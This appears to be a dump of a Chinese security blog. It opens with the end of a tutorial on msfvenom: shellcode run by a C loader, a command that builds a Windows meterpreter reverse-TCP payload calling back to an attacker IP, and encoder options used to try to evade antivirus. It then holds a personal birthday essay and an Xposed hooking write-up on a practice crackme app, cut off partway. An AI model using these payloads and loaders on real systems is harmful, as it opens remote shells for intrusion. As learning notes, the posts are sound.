class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113213545100.png" alt="image-20220113213545100"></p><p>成功弹回shell</p><hr><p>接下来尝试弹回一个功能更强大的meterpreter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -a x86 -f c</span><br></pre></td></tr></table></figure><p>重新生成shellcode并在加载器中更换</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113213942560.png" alt="image-20220113213942560"></p><h3 id="编码器使用"><a href="#编码器使用" class="headerlink" title="编码器使用"></a>编码器使用</h3><p>查看可用的编码器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list encoders</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220114092503877.png" alt="image-20220114092503877"></p><p>使用-e参数指定一个编码方式，使用-i参数指定编码次数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -e x86/xor_dynamic -i 5 -a x86 -f c</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220114092607517.png" alt="image-20220114092607517"></p><p>生成的shellcode与不加编码器确实有所不同，<strong>但是免杀效果几乎没有，不能作为真正的免杀解决方案</strong></p><ul><li>避免使用某些字符</li></ul><p>-b 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中<br>当这个参数被添加的时候，msfvenom 将会自动寻找合适的编码器来编码 Payload</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220114093443807.png" alt="image-20220114093443807"></p><p>功能还是很强大的</p><hr><p>MsfVenom的基本使用暂时就学习这些，下一阶段是使用不同语言的加载器对shellcode进行免杀。</p><blockquote><p>参考资料：<br><a href="https://xz.aliyun.com/t/2381">https://xz.aliyun.com/t/2381</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>写在23岁之前</title>
      <link href="/before-23-years-old.html"/>
      <url>/before-23-years-old.html</url>
      
        <content type="html"><![CDATA[<h3 id="写在23岁之前"><a href="#写在23岁之前" class="headerlink" title="写在23岁之前"></a>写在23岁之前</h3><p>作为一个非常注重仪式感的人，我总会在某个具有特殊意义的时间节点上发表一番感慨，这样的节点大多是某些具有特殊意义的事情告一段落结束。我会在一年结束时写总结；一场恋爱结束时写总结；一次旅行结束时总结；在考研复习刚刚开始时，我甚至会每月每周写一次总结来不断提醒自己。但我从来没有为过生日留下过文字，在思想上我是个理想主义，在生活中我却即为现实。我对自己的审视并不以生日为单位，毕竟成长是一系列事件作用的结果，时间仅仅是个不起眼的小角色。</p><p>今天是2021年11月27日，这个生日和以往有些不同：这会是我大学生涯里最后的一个生日。从2018年12月大一第一个学期，到如今大学生活进入尾声，整整三年过去了。往后的日子便是实习，毕设，读研or打工。上课，考试，社团活动等等大学生活日常一去不复返。在这样一个时间节点上，这个生日便有了特殊意义，我的表达欲望也越来越强烈。</p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/8d65c42f198c98849d2a7bda6722951.jpg" style="zoom:50%;" /><p> 从大二下学期开始，我对于自己的年龄开始变得敏感起来，因为那时是我真正开始全面反思自己，开始思考自己该学什么，以后想做什么。直接导致的结果是我对于时间变得焦虑起来，竞赛、考研、CTF、学习新技术，一时间想做的事情很多，同时也意识到自己剩余的时间不多了。</p><p>23岁对我究竟意味着什么？这个问题今天突然出现在我面前。由于某些历史原因，我比身边的同学平均要大两岁。我从未像今天这样深切的感觉到，时间是一个多么强大的资本，在20几岁的年纪，两年的时间是多么的宝贵。我羡慕一些人，他们有大把的时间去尝试自己选择的道路；我也替一些人悲哀，他们错把自己最宝贵的东西当成了最多余的而任意挥霍。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20211127213023484.png"></p><p>2021年我的主旋律就是考研，不过这也是我自己的意愿，经过思考后做出的选择。但我承认，做出这个决定后的一年，在考研即将进入尾声的12月，我的心态似乎发生了一些变化。人生的可能有很多啊，被大众熟知的，不被世俗认可的，受人称赞的，令人怀疑的。读研究生只是其中的一种可能，肯定还会有其它可能的。我觉得平常人最大的局限性就在于，选择了一条道路后，却向没有选择的那条道路不断张望，患得患失。这样看来我也在这个局限之中了。</p><p>我不否认这一点，在这两年学习的见闻中，我早已认识到：和那些令人赞叹的天才们相比（网络安全是个富有创造力的领域最不缺乏“天才少年”“天才黑客”），我不过是个普通人。但即便如此，我也拿出了最认真的态度来处理我面临的问题。“真正的英雄是认清世界后继续爱这个世界的人”。我认识到了自己的平凡，但继续争取每个改变的机会。时到今日我也有些理解罗曼罗兰这句话了。</p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/b0daf34023a49f3f7a9475a91692659.jpg" style="zoom:50%;" /><p>值得庆幸的是，从我开始为时间焦虑开始，我的行动也快人一步的进行了起来。自学专业知识，了解行业的就业情况，开始进入企业实习，提前联系导师实验室，提前确定毕设选题。对于大三大四的各种问题，我拿出了自己最认真的态度。</p><p>再回来思考，23岁对我究竟是怎样的意义。正如我在一开头说的，“成长是一系列事件作用的结果，时间仅仅是个不起眼的小角色”，现在与同阶段的人相比，我的时间不“那么”富余，也正因如此我有意识的让自己“快速”成长起来，让缺失的时间对我影响小一些。</p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20211127202750511.png" style="zoom:50%;" /><p>大学生活已经到了尾声，回想一年前正好是我最焦虑的日子，但现在看来当初担心事情都在我的努力下有了不错的结果。大学里最喜欢的学姐告诉过我：只要肯坚持至少不会把事情做到很差。这一路上我虽有很多遗憾，但从未后悔做出的每一个决定。虽然有过迷惘，但从未止步不前。23岁，我又面临新的问题，今后也请勇敢的坚持下去。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/75a49e65e053a255547c1fc58d46155.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 日记随想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对博客和播客以及Web3.0的一点思考</title>
      <link href="/blog-and-podcast.html"/>
      <url>/blog-and-podcast.html</url>
      
        <content type="html"><![CDATA[<p>博客和公众号已经很久没有更新了，上次更新还是在今年三月份。这一年几乎时间都用来准备考研。</p>]]></content>
      
      
      <categories>
          
          <category> 日记随想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Xposed模块开发课后作业</title>
      <link href="/Xposed-Homework.html"/>
      <url>/Xposed-Homework.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>原教程链接<a href="https://www.52pojie.cn/thread-850885-1-1.html">https://www.52pojie.cn/thread-850885-1-1.html</a></p></blockquote><blockquote><p>原教程解锁程序下载链接<a href="https://github.com/luckyfuture0177/BlogData/blob/master/temporary/%E8%A7%A3%E9%94%81%E7%A8%8B%E5%BA%8F.zip">https://github.com/luckyfuture0177/BlogData/blob/master/temporary/%E8%A7%A3%E9%94%81%E7%A8%8B%E5%BA%8F.zip</a></p></blockquote><h3 id="破解流程"><a href="#破解流程" class="headerlink" title="破解流程"></a>破解流程</h3><p>将作业app放入JEB进行反编译</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210330153929559.png" alt="image-20210330153929559"></p><p>分析MainActivity解锁部分的代码，v0变量是一个字符串拼接，经过两次a.a方法的处理，最后取前六位。</p><p>跟进a.a方法</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210330154802158.png" alt="image-20210330154802158"></p><p>这是一个加密算法，将传入的参数进行一系列的处理，最后返回。我们可以直接hook这个方法，让它把返回值打印出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.luckyfuture.xposedpractice1;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookMain</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span>(!lpparam.packageName.equals(<span class="string">&quot;com.ss.android.ugc.aweme&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(<span class="string">&quot;Hook_work&quot;</span>,<span class="string">&quot;进入解锁程序&quot;</span>);</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;com.hfdcxy.android.by.test.a&quot;</span>, <span class="comment">//包名+类名</span></span><br><span class="line">                lpparam.classLoader,           <span class="comment">//固定格式</span></span><br><span class="line">                <span class="string">&quot;a&quot;</span>,                          <span class="comment">//方法名</span></span><br><span class="line">                String.class,                  <span class="comment">//参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="comment">//before什么都不做</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.i(<span class="string">&quot;解锁密码&quot;</span>,param.getResult().toString()); <span class="comment">//打印a方法的返回值</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装到模拟器上实验</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210330162337195.png" alt="image-20210330162337195"></p><p>成功打印出返回值，因为a.a方法被调用了两次，所以只看最后一次的即可。前六位为解锁密码，输入即可进入下一关。</p><p>分析第二关的反编译代码</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210330162946050.png" alt="image-20210330162946050"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210330163339765.png" alt="image-20210330163339765"></p><p>每次点击按钮coin值加1，然后将coin的值域0x270F（9999）比较。</p><p>我们可以hook p.a方法，Hook传入的参数，每次点击按钮coin值增加9999</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;com.hfdcxy.android.by.test.b&quot;</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                SharedPreferences.class,</span><br><span class="line">                TextView.class,</span><br><span class="line">                <span class="type">int</span>.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        param.args[<span class="number">2</span>] = <span class="number">9999</span>; <span class="comment">//修改第三个参数</span></span><br><span class="line">                        Log.i(<span class="string">&quot;Tiger_test&quot;</span>,<span class="string">&quot;成功充值一万金币&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210330164718049.png" alt="image-20210330164718049"></p><p>Hook成功</p><h3 id="其它思路"><a href="#其它思路" class="headerlink" title="其它思路"></a>其它思路</h3><h4 id="Hook-substring系统函数"><a href="#Hook-substring系统函数" class="headerlink" title="Hook substring系统函数"></a>Hook substring系统函数</h4><p>第一步生成解锁码时，调用了substring函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String v0 = a.a(a.a(Settings.System.getString(MainActivity.this.getContentResolver(), &quot;android_id&quot;)) + &quot;hfdcxy1011&quot;).substring(0, 6);</span><br></pre></td></tr></table></figure><p>能否Hook这个函数，打印解锁码</p><p>首先在Android studio中调用这个函数，查看它的源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">substring</span><span class="params">(<span class="type">int</span> beginIndex, <span class="type">int</span> endIndex)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (beginIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StringIndexOutOfBoundsException</span>(<span class="built_in">this</span>, beginIndex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (endIndex &gt; length()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StringIndexOutOfBoundsException</span>(<span class="built_in">this</span>, endIndex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">subLen</span> <span class="operator">=</span> endIndex - beginIndex;</span><br><span class="line">    <span class="keyword">if</span> (subLen &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StringIndexOutOfBoundsException</span>(subLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Android-changed: Use native fastSubstring instead of String constructor.</span></span><br><span class="line">    <span class="keyword">return</span> ((beginIndex == <span class="number">0</span>) &amp;&amp; (endIndex == length())) ? <span class="built_in">this</span></span><br><span class="line">            : fastSubstring(beginIndex, subLen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接编写Hook代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">&quot;substring&quot;</span>,</span><br><span class="line">                <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">int</span>.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;substring的返回值为&quot;</span>+param.getResult().toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210331093624742.png" alt="image-20210331093624742"></p><p>Hook成功</p><h4 id="Hook-类中静态变量"><a href="#Hook-类中静态变量" class="headerlink" title="Hook 类中静态变量"></a>Hook 类中静态变量</h4><p>还有一个地方调用了解锁码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.hfdcxy.android.by.a.a.a(&quot;解锁码&quot; + v0);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210331093703341.png" alt="image-20210331093703341"></p><p>这里可以Hook a.a方法的参数，直接将arg1打印出来，即为解锁码。也可以Hook a类中的静态变量使a.a=True，让程序自己打印出解锁码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.ss.android.ugc.aweme&quot;</span>)) &#123;</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;找到包&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;com.hfdcxy.android.by.a.a&quot;</span>, lpparam.classLoader);</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;找到类&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">a</span> <span class="operator">=</span> Clazz.getDeclaredField(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;找到字段&quot;</span>);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            XposedHelpers.setStaticObjectField(Clazz,<span class="string">&quot;a&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;静态变量a的值已被修改&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>运行程序，成功修改了a的值，app自己打印出了解锁码</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210331090918798.png" alt="image-20210331090918798"></p><p>所有代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.luckyfuture.xposedpractice1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findClass;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findField;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.incrementMethodDepth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookMain</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.ss.android.ugc.aweme&quot;</span>)) &#123;</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;找到包&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;com.hfdcxy.android.by.a.a&quot;</span>, lpparam.classLoader);</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;找到类&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">a</span> <span class="operator">=</span> Clazz.getDeclaredField(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;找到字段&quot;</span>);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            XposedHelpers.setStaticObjectField(Clazz,<span class="string">&quot;a&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;静态变量a的值已被修改&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!lpparam.packageName.equals(<span class="string">&quot;com.ss.android.ugc.aweme&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;进入解锁程序&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;com.hfdcxy.android.by.test.a&quot;</span>, <span class="comment">//包名+类名</span></span><br><span class="line">                lpparam.classLoader,           <span class="comment">//固定格式</span></span><br><span class="line">                <span class="string">&quot;a&quot;</span>,                          <span class="comment">//方法名</span></span><br><span class="line">                String.class,                  <span class="comment">//参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="comment">//before什么都不做</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;a方法的返回值为&quot;</span>+param.getResult().toString()); <span class="comment">//打印a方法的返回值</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;com.hfdcxy.android.by.test.b&quot;</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                SharedPreferences.class,</span><br><span class="line">                TextView.class,</span><br><span class="line">                <span 